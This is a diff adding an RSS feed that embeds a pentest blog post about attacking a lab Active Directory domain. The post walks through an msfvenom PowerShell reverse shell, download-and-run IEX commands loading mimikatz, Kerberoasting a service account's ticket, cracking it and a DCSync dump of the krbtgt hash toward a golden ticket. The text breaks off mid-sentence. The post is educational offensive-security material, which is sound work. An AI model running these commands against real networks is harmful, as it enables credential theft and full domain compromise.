@@ -1,0 +1,512 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Active Directory on #!/slash/note</title>
+    <link>https://leonjza.github.io/categories/active-directory/</link>
+    <description>Recent content in Active Directory on #!/slash/note</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 09 Jan 2016 10:12:09 +0200</lastBuildDate>
+    <atom:link href="https://leonjza.github.io/categories/active-directory/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>kerberos, kerberoast and golden tickets</title>
+      <link>https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/</link>
+      <pubDate>Sat, 09 Jan 2016 10:12:09 +0200</pubDate>
+      
+      <guid>https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/</guid>
+      <description>
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_active_directory_logo.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Active Directory is almost always in scope for many pentests. There is sometimes a competitive nature amongst pentesters where the challenge is to see who can set a new record for gaining Domain Administrative privileges the fastest. How sad its that?&lt;/p&gt;
+
+&lt;p&gt;The reality is, &lt;em&gt;many&lt;/em&gt; times, the escalation processes is trivial. Pwn some workstation with admin creds, grab credentials out of &lt;code&gt;lsass&lt;/code&gt; and pass the hash to move around laterally. This has been the typical breakfast of many pentesters. Heck, there are even attempts to &lt;a href=&#34;https://github.com/sensepost/autoDANE&#34;&gt;automate&lt;/a&gt; this type of process because, personally, I feel its getting pretty old. Yet, its still very viable as an attack method due to its high success rate!&lt;/p&gt;
+
+&lt;p&gt;This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!&lt;/p&gt;
+
+&lt;h2 id=&#34;lets-set-the-scene:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;lets set the scene&lt;/h2&gt;
+
+&lt;p&gt;Kerberos, a network authentication protocol that works off a ticketing type system is deeply baked into AD. Of late, a lot more focus has been put on it by the offensive security community as you will see later in this post. I am not going to go into much (if any) of the technicalities of Kerberos itself as I feel there really is more than enough resources out there you can refer to! The below list references some great posts about the same topic I am writing about there:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Kerberos_(protocol)&#34;&gt;https://en.wikipedia.org/wiki/Kerberos_(protocol)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&#34;&gt;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/&#34;&gt;http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2362&#34;&gt;https://adsecurity.org/?p=2362&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For all of the attacks detailed here, I have a relatively simple setup in a lab. One (Server 2012) Domain Controller for the &lt;em&gt;foo.local&lt;/em&gt; domain. Two client PCs joined to the domain running Windows 7 and Windows 10. Another IIS Web server running on Server 2012 Core also joined to the domain and Kali Linux &amp;lsquo;attacker&amp;rsquo; on the same subnet as all of these Windows computers.&lt;/p&gt;
+
+&lt;p&gt;One key piece of the puzzle I am leaving out is how the initial shell was obtained. This could have happened a variety of ways and will probably always be different with every engagement. Lets just assume that I have a meterpreter shell as a non privileged domain user on the Windows 10 client PC.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_initial_meterpreter.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.&lt;/p&gt;
+
+&lt;h1 id=&#34;spn-scanning-the-setup:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;spn scanning - the setup&lt;/h1&gt;
+
+&lt;p&gt;One of the avenues we can pursue now is to query Active Directory for objects that have a &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx&#34;&gt;Service Principal Name&lt;/a&gt; set.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service. If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Basically, what this means is that someone went and configured a SPN for a service account that is used by multiple by instances of a service. Each of the client PC&amp;rsquo;s in my lab are running an instance of &lt;a href=&#34;https://www.microsoft.com/en/server-cloud/products/sql-server-editions/sql-server-express.aspx&#34;&gt;SQL Server 2014 Express&lt;/a&gt;, configured to run with the &lt;code&gt;svcSQLServ&lt;/code&gt; domain service account.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;When a client wants to connect to a service, it locates an instance of the service, composes an SPN for that instance, connects to the service, and presents the SPN for the service to authenticate.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;On my domain controller, I configured the SPN&amp;rsquo;s with the following commands:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\&amp;gt; setspn -A svcSQLServ/pc1.foo.local:1433 foo\svcSQLServ
+Checking domain DC=foo,DC=local
+
+Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
+        svcSQLServ/pc1.foo.local:1433
+Updated object
+
+PS C:\&amp;gt; setspn -A svcSQLServ/pc2.foo.local:1433 foo\svcSQLServ
+Checking domain DC=foo,DC=local
+
+Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,DC=local
+        svcSQLServ/pc2.foo.local:1433
+Updated object
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;spn-scanning-the-offensive-perspective:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;spn scanning - the offensive perspective&lt;/h2&gt;
+
+&lt;p&gt;Right, with the configuration done, lets put on our offensive hats and try and abuse this. I think one thing that one should realize is that this is a very nice way to get a &lt;em&gt;free port scan&lt;/em&gt; done too. You will see in a moment. =]&lt;/p&gt;
+
+&lt;p&gt;Reading some posts and stuff online, I have found a PowerShell module that will prep the LDAP lookup and scan for SPNs for you &lt;a href=&#34;https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts&#34;&gt;here&lt;/a&gt;. The gist of it is this LDAP search &lt;code&gt;(&amp;amp;(objectcategory=user)(serviceprincipalname=*))&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;To use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn &lt;code&gt;powershell.exe&lt;/code&gt; from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.&lt;/p&gt;
+
+&lt;h3 id=&#34;setup-a-powershell-connection:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;setup a powershell connection&lt;/h3&gt;
+
+&lt;p&gt;We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the &lt;code&gt;exec_powershell&lt;/code&gt; post module. In a new terminal, run &lt;code&gt;msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 1727 bytes
+���`��1�d�P0�R
+�8�u�}�;}$u�X�X$�f�Y ӋI�:I�4��1����
+                      K�XӋ�ЉD$$[[aYZQ��__Z���]j���Ph1�o��ջ���Vh������&amp;lt;|
+���u�GrojS��powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $($s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(&#39;H4sIABX0kF ... snip ... AAA=&#39;));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This will give you the raw payload you need to run to get a remote powershell shell. Copy the output from &lt;code&gt;IEX&lt;/code&gt; all the way to &lt;code&gt;ReadToEnd();)&lt;/code&gt; and paste that in a new file (I used &lt;code&gt;/root/power-shell.ps1&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;Now, back at your metasploit session, background the meterpreter session and setup a new &lt;code&gt;exploit/multi/handler&lt;/code&gt; for the &lt;code&gt;windows/powershell_reverse_tcp&lt;/code&gt; payload. When you issue the &lt;code&gt;exploit&lt;/code&gt; command, add &lt;code&gt;-j&lt;/code&gt; so that the job will run in the background. We have one more thing to do before it will connect back.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_powershell_handler.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Fantastic. We are ready to accept the powershell connection! The last thing left to do is to execute the script we generated earlier with &lt;code&gt;msfvenom&lt;/code&gt;! Use the &lt;code&gt;exec_powershell&lt;/code&gt; post module and configure it to pickup the script where ever you placed it on disk:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_exec_powershell.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;With the module configured to use the meterpreter session we originally got, as well as our exploit handler waiting in the background for the powershell connection, we can &lt;code&gt;run&lt;/code&gt; this module and hope it works!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_powershell_shell.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;blockquote&gt;
+&lt;p&gt;Powershell session session 3 opened&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ok, that was a lot of work, but now we have the environment we need to get in with the SPN scanning! Simply interact with the session that spawned.&lt;/p&gt;
+
+&lt;p&gt;The next thing we want to do is get the &lt;code&gt;Find-PSServiceAccounts&lt;/code&gt; PowerShell function into the environment. The script lives &lt;a href=&#34;https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccounts&#34;&gt;here&lt;/a&gt;. Thankfully, we can kind of &lt;em&gt;include&lt;/em&gt; functions into the current session by using the powershell &lt;code&gt;Invoke-Expression&lt;/code&gt; cmdlet. To do that we run:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Expression (New-Object Net.Webclient).downloadstring(&#39;https://raw.githubusercontent.com/PyroTek3/PowerShell-AD-Recon/master/Find-PSServiceAccounts&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thats it. We can now just run the method!!&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_find_psserviceaccounts.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;We have just discovered the service account &lt;code&gt;svcSQLServ&lt;/code&gt; and 2 hosts there it is in use!
+The script also accepts a few arguments, such as &lt;code&gt;-DumpSPN&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Find-PSServiceAccounts -DumpSPN
+Discovering service account SPNs in the AD Domain foo.local
+svcSQLServ/pc1.foo.local:1433
+svcSQLServ/pc2.foo.local:1433
+PS C:\Users\bobs\Downloads&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is the part where I remind you about the &lt;em&gt;free port scan&lt;/em&gt; I mentioned earlier. Notice how we have discovered services, ports and accounts running them using just an LDAP query. Highly doubt that will trigger many monitoring tools out there!&lt;/p&gt;
+
+&lt;h2 id=&#34;kerberos-service-tickets:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;kerberos service tickets&lt;/h2&gt;
+
+&lt;p&gt;We now have 2 SPN&amp;rsquo;s that we managed to query off the domain. &lt;code&gt;svcSQLServ/pc1.foo.local:1433&lt;/code&gt; &amp;amp; &lt;code&gt;svcSQLServ/pc2.foo.local:1433&lt;/code&gt;. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;This is where you need to pay attention.&lt;/em&gt; The service ticket is encrypted using the secret key (&lt;em&gt;read, &amp;lsquo;password&amp;rsquo;&lt;/em&gt;) of the account used in the SPN (&lt;code&gt;svcSQLServ&lt;/code&gt; in this case)! The server never checks if the ticket ever went through the entire process of actually being used, it just happily generates them for whoever asks&amp;hellip; Note, the server hosting the service will still validate the ticket itself (99% without rechecking with the Kerberos server btw).&lt;/p&gt;
+
+&lt;p&gt;What does that mean for an attacker? Well, we can request the service ticket&amp;hellip; and&amp;hellip; attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.&lt;/p&gt;
+
+&lt;h2 id=&#34;enter-kerberoast:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;enter kerberoast&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt; is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN&amp;rsquo;s (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the &lt;code&gt;tgsrepcrack.py&lt;/code&gt; script to crack against a wordlist.&lt;/p&gt;
+
+&lt;p&gt;All of this can be done as a normal domain user and does not require any elevated privileges. To assist us in dumping kerberos tickets out of memory, we are going to load mimikatz by using &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; (from the &lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1&#34;&gt;PowerSploit Repository&lt;/a&gt;). This method has a very small to no chance of getting detected by AV atm. Lets get that loaded:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Invoke-Expression (New-Object Net.Webclient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;)
+PS C:\&amp;gt; Invoke-Mimikatz
+
+  .#####.   mimikatz 2.0 alpha (x64) release &amp;quot;Kiwi en C&amp;quot; (Dec 14 2015 19:16:34)
+ .## ^ ##.
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  &#39;#####&#39;                                     with 17 modules * * */
+
+
+mimikatz(powershell) # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+mimikatz(powershell) # exit
+Bye!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just running &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; might not be entirely opsec safe as, by default, it will run the &lt;code&gt;sekurlsa::logonpasswords&lt;/code&gt; command (which may trigger some monitoring). You may have also noticed the &lt;code&gt;LOAD_MODULES&lt;/code&gt; setting in the &lt;code&gt;windows/powershell_reverse_tcp&lt;/code&gt; payload. Here we can actually give it the URL&amp;rsquo;s we are going to load with &lt;code&gt;Invoke-Expression&lt;/code&gt; and metasploit will download and prep that for you! :)&lt;/p&gt;
+
+&lt;p&gt;Anyways, lets check the current cached kerberos tickets that we have for this session.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::list&amp;quot;&#39;
+
+  .#####.   mimikatz 2.0 alpha (x64) release &amp;quot;Kiwi en C&amp;quot; (Dec 14 2015 19:16:34)
+ .## ^ ##.
+ ## / \ ##  /* * *
+ ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ &#39;## v ##&#39;   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
+  &#39;#####&#39;                                     with 17 modules * * */
+
+
+mimikatz(powershell) # kerberos::list
+
+PS C:\&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looks like there are no cached Kerberos tickets for this session. This can also be checking by running the &lt;code&gt;klist&lt;/code&gt; command:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; klist
+
+Current LogonId is 0:0x3fde2
+
+Cached Tickets: (0)
+PS C:\&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you had tickets here, you can purge them from memory by running &lt;code&gt;Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::purge&amp;quot;&#39;&lt;/code&gt;.
+Lets request a service ticket for the &lt;code&gt;svcSQLServ/pc1.foo.local:1433&lt;/code&gt; SPN (The command syntax can be seen in the Kerberoast repository):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
+PS C:\&amp;gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &amp;quot;svcSQLServ/pc1.foo.local:1433&amp;quot;
+
+
+Id                   : uuid-33208c1c-6f30-441f-af50-94ba72a2ed7b-1
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 1/9/2016 7:29:11 PM
+ValidTo              : 1/10/2016 5:29:11 AM
+ServicePrincipalName : svcSQLServ/pc1.foo.local:1433
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+
+
+PS C:\&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If you wanted to tickets for all the possible SPN&amp;rsquo;s, we could have run the below that will loop over the results from &lt;code&gt;Find-PSServiceAccounts&lt;/code&gt; and request a ticket for each:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; Add-Type -AssemblyName System.IdentityModel
+PS C:\&amp;gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System.Identity Model.Tokens.KerberosRequestorSecurityToken -ArgumentList $_ }
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now, if we recheck the tickets we have for this session, we can see that we have one for &lt;code&gt;svcSQLServ&lt;/code&gt;:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_spn.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;dumping-kerberos-tickets-from-memory:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;dumping kerberos tickets from memory&lt;/h2&gt;
+
+&lt;p&gt;Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again:&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_exported_tickets.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;&lt;code&gt;1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi&lt;/code&gt; is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D&lt;/p&gt;
+
+&lt;h2 id=&#34;cracking-the-kerberos-ticket:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;cracking the kerberos ticket&lt;/h2&gt;
+
+&lt;p&gt;Back at my meterpreter session, we can simply download the ticket locally, and start the crack. &lt;code&gt;tgsrepcrack.py&lt;/code&gt; allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.&lt;/p&gt;
+
+&lt;p&gt;So download the ticket&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;meterpreter &amp;gt; cd downloads/kerb
+meterpreter &amp;gt; ls
+Listing: C:\users\bobs\downloads\kerb
+=====================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  1260  fil   2016-01-09 14:35:09 -0500  0-40e10000-bobs@krbtgt~FOO.LOCAL-FOO.LOCAL.kirbi
+100666/rw-rw-rw-  1364  fil   2016-01-09 14:35:09 -0500  1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+
+meterpreter &amp;gt; download Interrupt: use the &#39;exit&#39; command to quit
+meterpreter &amp;gt; download 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi /root/
+[*] downloading: 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&amp;gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+[*] download   : 1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi -&amp;gt; /root//1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&amp;hellip; and crack it!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;root@kali:~/kerberoast# python tgsrepcrack.py /usr/share/wordlists/fasttrack.txt /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+found password for ticket 0: Password1  File: /root/1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi
+All tickets cracked!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;Password1&lt;/code&gt; is the password for the &lt;code&gt;svcSQLServ&lt;/code&gt; account! \o/&lt;/p&gt;
+
+&lt;p&gt;One reason why having the password for this account is especially bad is because of its group memberships&amp;hellip; Yes, I know. You may not easily see this in real life, but just bear with me for now.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\&amp;gt; net user svcSQLServ /domain
+The request will be processed at a domain controller for domain foo.local.
+
+User name                    svcSQLServ
+Full Name                    SQL Server
+Comment                      SQL Server Serice Account
+User&#39;s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/7/2016 11:38:02 PM
+Password expires             Never
+Password changeable          1/8/2016 11:38:02 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/9/2016 10:33:41 AM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Domain Admins
+The command completed successfully.
+
+PS C:\&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;testing-the-credentials:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;testing the credentials&lt;/h2&gt;
+
+&lt;p&gt;For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.&lt;/p&gt;
+
+&lt;p&gt;We will start by configuring a credentials object, and then just run the &lt;code&gt;Get-Process&lt;/code&gt; cmdlet on the domain controller as proof.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;$pass = &#39;Password1&#39; | ConvertTo-SecureString -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential -ArgumentList &#39;svcSQLServ&#39;, $pass
+Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With output&amp;hellip;&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_svcsqlserv_remoting.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user&amp;hellip;&lt;/p&gt;
+
+&lt;h1 id=&#34;golden-tickets:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;golden tickets&lt;/h1&gt;
+
+&lt;p&gt;We have domain administrative rights now. There is nothing left to do, we can write the pentest report and go home. Or can we? Well yes, but what if the password to &lt;code&gt;svcSQLServ&lt;/code&gt; changes? That would mean we lose access! One way we can prevent this is by creating a &lt;em&gt;golden ticket&lt;/em&gt; that we can re-use to grant ourselves whatever permission we like, as any user we like! Sounds great eh :D&lt;/p&gt;
+
+&lt;p&gt;To create a golden ticket, we can use either the &lt;em&gt;kiwi&lt;/em&gt; extension in metasploit, or &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; again! There are a few prerequisites that we need to satisfy for golden tickets. The most important being that we need at least the NT hash of the &lt;code&gt;krbtgt&lt;/code&gt; user of the domain. Without that, this is not a viable persistence strategy.&lt;/p&gt;
+
+&lt;p&gt;The complete list of prerequisites are:
+- The Domains FQDN
+- The Domains SID
+- The &lt;code&gt;krbtgt&lt;/code&gt; accounts NT hash
+- A username (fake or real, does not matter. Not fake if you need opsec ofc!)&lt;/p&gt;
+
+&lt;p&gt;Getting the FQDN and SID (&lt;code&gt;whoami /user&lt;/code&gt;) of the Domain should be relatively trivial. Remember to grab the SID without the &lt;a href=&#34;https://en.wikipedia.org/wiki/Security_Identifier&#34;&gt;trailing RID&lt;/a&gt;. So if the full SID is &lt;code&gt;S-1-5-21-2222611480-1876485831-1594900117-1104&lt;/code&gt; then you are only going to use &lt;code&gt;S-1-5-21-2222611480-1876485831-1594900117&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Getting the NT Hash of the &lt;code&gt;krbtgt&lt;/code&gt; account though is something I want to show using a recent feature addition to mimikatz, &lt;a href=&#34;http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/&#34;&gt;DCSync&lt;/a&gt;. The gist of it is that its possible to extract hashes from a Domain Controller (using a domain admin type account), without actually running any code on the Domain Controller itself! This is of course not the only way to get the required hash. Many of the older techniques work just fine. That means hash extraction from any PC on the domain (authenticated as a admin), but ‘faking’ being a Domain Controller and triggering some replication-fu! In my case, I struggled a little to get this replication done from a client PC in the lab via the metasploit interactive PowerShell session, but could do it successfully from a client PC via the console. So, its definitely possible!&lt;/p&gt;
+
+&lt;p&gt;In this case, to use the DCSync feature of mimikatz, I am going to use PowerShell Remoting to run commands. Unfortunately, due to the way &lt;code&gt;Enter-PSSession&lt;/code&gt; sets up the shell, I can&amp;rsquo;t seem to get an interactive shell as another user via metasploit going without using another exploit &amp;amp;&amp;amp; payload combination. So, we are just going to use &lt;code&gt;Invoke-Command&lt;/code&gt; with our commands.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\&amp;gt; $creds
+
+UserName                       Password
+--------                       --------
+svcSQLServ System.Security.SecureString
+
+
+PS C:\&amp;gt; Invoke-Command -ScriptBlock {Write-Output $env:username} -Credential $creds -ComputerName dc1
+svcSQLServ
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Great so that works. To continue, we are going to have to run a few commands.
+- &lt;code&gt;Invoke-Expression&lt;/code&gt; to get mimikatz
+- Run &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; with &lt;code&gt;lsadump::dcsync /user:krbtgt&lt;/code&gt; and its required parameters
+- Dance!&lt;/p&gt;
+
+&lt;p&gt;I constructed my command that needed to be run on my PowerShell session and ended up with this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Invoke-Command -ScriptBlock {Invoke-Expression (New-Object Net.Webclient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Command &#39;&amp;quot;lsadump::dcsync /user:krbtgt&amp;quot;&#39;} -Credential $creds -ComputerName dc1
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Let me try explain what is going on here. I am saying, &lt;code&gt;Invoke-Command&lt;/code&gt; on the computer &lt;code&gt;dc1&lt;/code&gt; as &lt;code&gt;svcSQLServ&lt;/code&gt; (stored in the &lt;code&gt;$creds&lt;/code&gt; variable) using PowerShell Remoting. The command to run is defined in the &lt;code&gt;ScriptBlock {}&lt;/code&gt; which is; download mimikatz; run &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; with the &lt;code&gt;lsadump::dcsync /user:krbtgt&lt;/code&gt; command.&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_krbtgt.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;We have the hash for &lt;code&gt;krbtgt&lt;/code&gt;! &lt;code&gt;95a11f7d93fa3a5a61073662e6bd8468&lt;/code&gt; : D That means I have everything I need to create a golden ticket, with all the access in the world! To summarize, my prerequisites are satisfied with the following values:&lt;/p&gt;
+
